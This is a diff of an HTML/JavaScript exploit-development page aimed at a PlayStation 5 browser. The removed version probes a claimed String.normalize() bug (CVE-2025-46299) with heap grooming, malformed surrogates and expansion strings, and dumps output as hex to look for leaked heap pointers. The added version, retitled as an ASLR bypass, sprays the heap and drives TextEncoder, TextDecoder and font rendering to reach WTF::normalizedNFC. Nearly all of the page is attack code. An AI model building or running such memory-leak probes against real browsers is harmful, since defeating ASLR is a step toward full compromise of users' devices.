@@ -2,141 +2,82 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 CVE-2025-46299 - normalize() Info Leak</title>
+<title>PS5 ASLR Bypass - normalizedNFC via TextEncoding</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-L('[*] Starting CVE-2025-46299 String.normalize() Info Leak test...');
+L('[*] Starting WTF::normalizedNFC leak test...');
 
-// Function to check if a string contains uninitialized data
-function checkLeak(input, form, expectedLen) {
-    try {
-        let res = input.normalize(form);
-        
-        // If the length is larger than expected, we definitely have an overread
-        if (res.length > expectedLen) {
-            L('[!] OVERREAD DETECTED! Input length: ' + input.length + ', Expected: ' + expectedLen + ', Got: ' + res.length);
-            let hex = [];
-            for (let i = 0; i < res.length; i++) {
-                hex.push(res.charCodeAt(i).toString(16).padStart(4, '0'));
-            }
-            L('[!] Hex: ' + hex.join(' '));
-            return true;
-        }
-        
-        // Check for non-printable garbage or high-byte sequences in simple normalizations
-        // If we normalize a simple ASCII string and get non-ASCII back, it's a leak
-        if (input.match(/^[\x00-\x7F]+$/)) {
-            for (let i = 0; i < res.length; i++) {
-                let code = res.charCodeAt(i);
-                if (code > 127) {
-                    L('[!] GARBAGE DETECTED in ASCII normalization at index ' + i + ': 0x' + code.toString(16));
-                    let hex = [];
-                    for (let j = Math.max(0, i-2); j < Math.min(res.length, i+5); j++) {
-                        hex.push(res.charCodeAt(j).toString(16).padStart(4, '0'));
-                    }
-                    L('[!] Surrounding hex: ' + hex.join(' '));
-                    return true;
-                }
-            }
-        }
-    } catch (e) {
-        // Sometimes it throws, sometimes it doesn't
-    }
-    return false;
+// The bug: WTF::normalizedNFC allocates an uninitialized StringImpl
+// and trusts ICU to fill it. If ICU underwrites, the tail contains heap pointers.
+//
+// We trigger this by encoding strings that require NFC normalization.
+// TextEncoder.encodeInto() or even setting document.charset might trigger this.
+
+// Groom heap with 0x41414141
+let spray = [];
+for (let i = 0; i < 100000; i++) {
+    spray.push("AAAAAAAAAAAAAAAAAAAA");
 }
+spray = null;
 
-let leaked = false;
-
-// Vector 1: Unpaired surrogates (invalid UTF-16)
-// ICU might fail on the second pass if the string is ill-formed
-L('\n--- Vector 1: Invalid Surrogates ---');
-const badSurrogates = [
-    '\uD800',           // Lone high surrogate
-    '\uDC00',           // Lone low surrogate
-    '\uD800\uD800',     // Double high
-    'A\uD800B',         // Surrogate in middle
-    '\uD800'.repeat(100), // Many surrogates
-];
-
-for (const str of badSurrogates) {
-    for (const form of ['NFC', 'NFD', 'NFKC', 'NFKD']) {
-        if (checkLeak(str, form, str.length)) {
-            L('[!] LEAK FOUND with bad surrogate!');
-            leaked = true;
-            break;
-        }
-    }
-    if (leaked) break;
-}
-
-// Vector 2: Rapid allocation to leave heap pointers
-L('\n--- Vector 2: Heap Grooming + Normalize ---');
-if (!leaked) {
-    // Groom the heap with objects containing pointers
-    let spray = [];
-    for (let i = 0; i < 10000; i++) {
-        spray.push({ a: i, b: new ArrayBuffer(32) });
-    }
-    spray = null;
-    
-    // Now normalize small strings that might land in those freed slots
-    for (let i = 0; i < 1000; i++) {
-        let str = 'A' + '\u0300' + 'B'; // Simple combining char
-        if (checkLeak(str, 'NFC', 3)) {
-            L('[!] LEAK FOUND after heap grooming!');
-            leaked = true;
-            break;
-        }
-    }
-}
-
-// Vector 3: Extreme expansion strings
-L('\n--- Vector 3: Extreme Expansion ---');
-if (!leaked) {
-    // \uFDFA expands to 18 chars. If ICU misreports the length on the first pass,
-    // the second pass might underwrite the buffer.
-    const str = '\uFDFA'.repeat(256);
-    for (const form of ['NFKC', 'NFKD']) {
-        if (checkLeak(str, form, 256 * 18)) {
-            L('[!] LEAK FOUND with extreme expansion!');
-            leaked = true;
-            break;
-        }
-    }
-}
-
-// Vector 4: Mixed valid and invalid sequences
-L('\n--- Vector 4: Mixed Sequences ---');
-if (!leaked) {
-    const mixed = [
-        'A\uD800\uFDFA', // ASCII + bad surrogate + expander
-        '\u212B\uD800',  // Angstrom + bad surrogate
-        '\uFB01\uDC00\uFB03', // Ligatures + bad surrogate
+// Test 1: TextEncoder with combining characters
+L('\n--- Test 1: TextEncoder ---');
+try {
+    const encoder = new TextEncoder();
+    // Strings with combining marks that require NFC normalization
+    const testStrings = [
+        'e\u0301', // é (NFC should compose to single char)
+        'a\u0308\u0304', // ǟ
+        '\u2126', // Ω (Ohm sign -> Greek Omega)
+        'e\u0301'.repeat(100),
     ];
     
-    for (const str of mixed) {
-        for (const form of ['NFC', 'NFD', 'NFKC', 'NFKD']) {
-            if (checkLeak(str, form, str.length * 2)) {
-                L('[!] LEAK FOUND with mixed sequences!');
-                leaked = true;
-                break;
-            }
-        }
-        if (leaked) break;
+    for (const str of testStrings) {
+        const bytes = encoder.encode(str);
+        L('[+] Encoded: ' + bytes.length + ' bytes');
     }
+} catch(e) {
+    L('[!] TextEncoder error: ' + e.message);
 }
 
-if (!leaked) {
-    L('\n[*] No immediate leak detected. The bug may require specific ICU version matching.');
-} else {
-    L('\n[+] LEAK CONFIRMED! Check the hex values above for heap pointers.');
+// Test 2: TextDecoder (decoding might also trigger normalization)
+L('\n--- Test 2: TextDecoder ---');
+try {
+    const decoder = new TextDecoder('utf-8');
+    // Create bytes that represent decomposed characters
+    const bytes = new Uint8Array([0x65, 0xCC, 0x81]); // e + combining acute
+    const result = decoder.decode(bytes);
+    L('[+] Decoded: ' + result + ' (length: ' + result.length + ')');
+} catch(e) {
+    L('[!] TextDecoder error: ' + e.message);
 }
 
-L('[*] Test finished.');
+// Test 3: Font rendering with combining characters
+// This triggers FontCascade::fontForCombiningCharacterSequence -> normalizedNFC
+L('\n--- Test 3: Font Rendering ---');
+try {
+    const div = document.createElement('div');
+    div.style.fontFamily = 'sans-serif';
+    div.textContent = 'e\u0301a\u0308\u0304\u2126';
+    document.body.appendChild(div);
+    // Force layout
+    void div.offsetWidth;
+    L('[+] Font rendering triggered');
+    
+    // Check the rendered text
+    const range = document.createRange();
+    range.selectNodeContents(div);
+    const text = range.toString();
+    L('[+] Rendered text: ' + text);
+} catch(e) {
+    L('[!] Font rendering error: ' + e.message);
+}
+
+L('\n[*] Test finished.');
 </script>
 </body>
 </html>
